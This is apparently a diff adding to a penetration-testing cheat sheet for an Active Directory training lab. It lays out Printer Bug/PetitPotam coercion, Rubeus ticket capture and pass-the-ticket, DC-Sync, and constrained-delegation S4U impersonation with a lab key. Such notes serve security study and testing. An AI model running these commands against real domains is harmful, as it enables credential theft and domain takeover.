@@ -84,3 +84,41 @@ C:> Get-DomainComputer -Unconstrained | select -ExpandProperty name
 <host_n>
 ```
 - Requisite for elevation using this technique, is to compromise a user with Admin Rights on the host
+
+#### Printer Bug
+```powershell
+# Need shell in the server to compromise
+# Launch Rubeus listener to capture TGT from DC 
+C:> Rubeus.exe monitor /targetuser:<dc-name>$ /interval:5 /nowrap
+
+# From a shell on our host, force DC auth to the server to compromise
+C:> MS-RPRN.exe \\<DC_fqdn_name> \\<server_to_compromise_fqdn>
+RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.     # This error is OK
+
+# PetiPoam can be user as well
+C:> PetitPotam.exe dcorp-appsrv dcorp-dc
+
+# At this point, in Rubeus we got the TGT for DC auth.
+# Copy the Base64EncodedTicket and use with Rubeus in a elevated shell from our host
+C:> Rubeus.exe ptt /ticket:<Base64EncodedTicket>
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+# At this point we get a ticket for the DC User
+# From here, a DC-Sync attack to DC to get krbtgt and also to enterprise DC.
+```
+#### Constrained Delegation
+```powershell
+# Get users with Constraied delegation
+C:> . .\PowerView.ps1
+C:> Get-DomainUser -TrustedToAuth
+```
+```powershell
+# Request a TGS
+C:> C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
+
+
+
+
+
+
